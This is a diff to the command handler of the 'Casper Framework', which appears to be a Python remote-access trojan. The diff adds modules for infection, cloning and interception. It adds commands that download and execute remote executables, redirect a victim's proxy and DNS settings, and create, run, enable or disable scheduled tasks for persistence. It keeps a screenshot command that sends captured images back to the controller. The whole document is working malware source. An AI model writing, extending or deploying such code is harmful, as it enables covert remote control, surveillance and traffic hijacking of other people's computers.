@@ -1,7 +1,14 @@
 """
 Part of Casper Framework
 """
-from includes import *
+from imports import *
+from encoder import *
+from downexec import *
+from infect import *
+from removal import *
+from clone import *
+from schtasks import *
+from intercept import *
 
 def socket_create():
 	"""
@@ -60,7 +67,7 @@ def socket_control(host,port,buffer):
 							socket_server.send(encode("\nExiting/shutting down server\n"))
 							socket_server.close()
 							sys.exit()
-						elif (data.split()[0] == "download"):
+						elif (data.split()[0] == "downexec"):
 							if (download_execute(data.split()[1],"tmp.exe",1) == True):
 								socket_server.send(encode("\nDownload and execute finished\n"))
 							else:
@@ -79,47 +86,57 @@ def socket_control(host,port,buffer):
 							if (clone(sys.argv[0]) == True):
 								socket_server.send(encode("\nSuccessfully cloned myself\n"))
 							else:
-								socket_server.send(encode("\nError during cloning of myself\n"))
-						# 
-						# intercept is under construction
-						# 
+								socket_server.send(encode("\nError during cloning of myself\n")) 
 						elif (data.split()[0] == "intercept"):
 							if (data.split()[1] == "proxy"):
 								if (change_proxy(data.split()[2],data.split()[3]) == True):
 									socket_server.send(encode("\nSuccessfully enabled proxy server\n"))
 								else:
 									socket_server.send(encode("\nError enabling proxy server\n"))
+							elif (data.split()[1] == "dns"):
+								if (change_dns(data.split()[2]) == True):
+									socket_server.send(encode("\nSuccessfully changed dns server\n"))
+								else:
+									socket_server.send(encode("\nError changing dns server\n"))
+							else:
+								socket_server.send(encode("\nError changing dns server\n"))
 						elif (data.split()[0] == "schtasks"):
 							if (data.split()[1] == "create"):
 								if (create_task(data.split()[2],data.split()[3]) == True):
 									socket_server.send(encode("\nSuccessfully created schtask\n"))
 								else:
-									socket_server.send(encode("\Error during creation of schtask\n"))
-							else:
-								pass
-							if (data.split()[1] == "run"):
+									socket_server.send(encode("\nError during creation of schtask\n"))
+							elif (data.split()[1] == "run"):
 								if  (run_task(data.split()[2]) == True):
 									socket_server.send(encode("\nSuccessfully ran schtask\n"))
 								else:
-									socket_server.send(encode("\Error while running schtask\n"))
-							else:
-								pass
-							if (data.split()[1] == "delete"):
+									socket_server.send(encode("\nError while running schtask\n"))
+							elif (data.split()[1] == "delete"):
 								if  (del_task(data.split()[2]) == True):
 									socket_server.send(encode("\nSuccessfully deleted schtask\n"))
 								else:
-									socket_server.send(encode("\Error during deletion of schtask\n"))
+									socket_server.send(encode("\nError during deletion of schtask\n"))
+							elif (data.split()[1] == "enable"):
+								if  (enable_disable_task(data.split()[2],data.split()[3]) == True):
+									socket_server.send(encode("\nSuccessfully enabled schtask\n"))
+								else:
+									socket_server.send(encode("\nError while enabling schtask\n"))
+							elif (data.split()[1] == "disable"):
+								if  (enable_disable_task(data.split()[2],data.split()[3]) == True):
+									socket_server.send(encode("\nSuccessfully disabled schtask\n"))
+								else:
+									socket_server.send(encode("\nError while disabling schtask\n"))
 							else:
-								pass								
+								socket_server.send(encode("\nError due to wrong parameters\n"))
 						elif (data.split()[0] == "screenshot"):
 								try:
 									with mss.mss() as screen:
-										logging.debug('[casper] Getting monitors')
+										logging.debug("[casper] Getting monitors")
 										image = screen.grab(screen.monitors[1-1])
 										
-										logging.debug('[casper] Reading image raw_bytes')
+										logging.debug("[casper] Reading image raw_bytes")
 										raw_bytes = mss.tools.to_png(image.rgb,image.size)
-										logging.debug('[casper] Successfully read image raw_bytes')
+										logging.debug("[casper] Successfully read image raw_bytes")
 										
 										socket_server.send(encode(raw_bytes))
 										socket_server.send(encode("\nSuccessfully received screenshot\n"))	
@@ -129,6 +146,7 @@ def socket_control(host,port,buffer):
 							pass
 				except Exception as e:
 					logging.debug("[casper] {}".format(e))
+					pass
 			else:
 				logging.debug("[casper] Unable to setup socket")
 	
